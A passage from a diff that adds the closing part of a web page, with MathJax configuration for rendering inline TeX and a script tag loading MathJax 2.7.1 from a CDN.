+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
